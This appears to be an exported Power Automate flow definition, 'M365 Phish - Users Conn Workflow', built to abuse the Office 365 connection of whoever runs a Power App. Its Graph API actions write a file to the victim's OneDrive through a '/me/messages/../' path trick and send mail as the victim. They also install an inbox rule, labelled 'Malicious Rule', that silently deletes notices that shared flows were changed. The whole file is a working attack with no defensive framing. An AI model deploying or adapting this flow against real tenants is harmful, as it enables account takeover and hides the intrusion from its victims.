{"name":"0b9daffa-13ce-4f55-8676-25f67171cd3c","id":"/providers/Microsoft.Flow/flows/0b9daffa-13ce-4f55-8676-25f67171cd3c","type":"Microsoft.Flow/flows","properties":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_logicflows","displayName":"M365 Phish - Users Conn Workflow","definition":{"metadata":{"workflowEntityId":null,"processAdvisorMetadata":null,"flowclientsuspensionreason":"None","flowclientsuspensiontime":null,"flowclientsuspensionreasondetails":null,"creator":{"id":"78dba543-9f7f-4eb8-aa2a-e185f44690c7","type":"User","tenantId":"51fc9f8f-fed1-4133-84b8-bbbe4de0b38d"},"provisioningMethod":"FromDefinition","failureAlertSubscription":true,"clientLastModifiedTime":"2022-12-17T23:55:00.0546105Z"},"$schema":"https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#","contentVersion":"1.0.0.0","parameters":{"$connections":{"defaultValue":{},"type":"Object"},"$authentication":{"defaultValue":{},"type":"SecureObject"}},"triggers":{"manual":{"metadata":{"operationMetadataId":"cdcb69e6-1833-4d10-a813-71bd59e7d6ee"},"type":"Request","kind":"PowerAppV2","inputs":{"schema":{"type":"object","properties":{},"required":[]}}}},"actions":{"Send_an_HTTP_request_-_Set_Mail_Rule_-_Hijack_Shared_Flows":{"runAfter":{"Send_an_HTTP_request_-_Place_file_in_OneDrive":["Succeeded"]},"metadata":{"operationMetadataId":"4af2c1ea-1003-423d-b76b-0f6f0656252e"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365users","connectionName":"shared_office365users","operationId":"HttpRequest"},"parameters":{"Uri":"https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules","Method":"POST","Body":"{      \n    \"displayName\": \"Malicious Rule: HTTP User Action - hijack Shared Flows\",      \n    \"sequence\": 1,\n    \"isEnabled\": true,\n    \"conditions\": {\n        \"bodyOrSubjectContains\": [\n          \"has changed one of your shared flows\"\n        ]\n     },\n     \"actions\": {\n        \"delete\":true,\n        \"markAsRead\": true,\n        \"stopProcessingRules\": true\n     }    \n}","ContentType":"application/json"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}},"Send_an_HTTP_request_-_Place_file_in_OneDrive":{"runAfter":{},"metadata":{"operationMetadataId":"6f680740-7c58-4737-a765-a4a591432e4a"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365users","connectionName":"shared_office365users","operationId":"HttpRequest"},"parameters":{"Uri":"https://graph.microsoft.com/v1.0/me/messages/../drive/items/root:/Created_with_Users_Action.txt:/content","Method":"PUT","Body":"meowmix","ContentType":"text/plain"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}},"Send_an_HTTP_request_-_Send_email":{"runAfter":{"Get_my_profile_(V2)":["Succeeded"]},"metadata":{"operationMetadataId":"287602fc-8150-401b-b7ee-d93430a812aa"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365users","connectionName":"shared_office365users","operationId":"HttpRequest"},"parameters":{"Uri":"https://graph.microsoft.com/v1.0/me/messages/../sendMail","Method":"POST","Body":"{\n  \"message\": {\n    \"subject\": \"Can you check this for me?\",\n    \"body\": {\n      \"contentType\": \"HTML\",\n      \"content\": \"Sending mail w/ User Action HTTP request\"\n    },\n    \"toRecipients\": [\n      {\n        \"emailAddress\": {\n          \"address\": \"@{outputs('Get_my_profile_(V2)')?['body/userPrincipalName']}\"\n        }\n      }\n    ]    \n  },\n  \"saveToSentItems\": \"false\"\n}","ContentType":"application/json"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}},"Get_my_profile_(V2)":{"runAfter":{"Send_an_HTTP_request_-_Set_Mail_Rule_-_Hijack_Shared_Flows":["Succeeded"]},"metadata":{"operationMetadataId":"299f63f2-3031-4608-bad7-5618a6b9f4be"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365users","connectionName":"shared_office365users","operationId":"MyProfile_V2"},"parameters":{},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}}},"outputs":{}},"connectionReferences":{"shared_office365users":{"connectionName":"shared-office365user-71412c91-fa65-47c2-87ed-8a242243001d","source":"Invoker","id":"/providers/Microsoft.PowerApps/apis/shared_office365users","tier":"NotSpecified"}},"flowFailureAlertSubscribed":false,"isManaged":false}}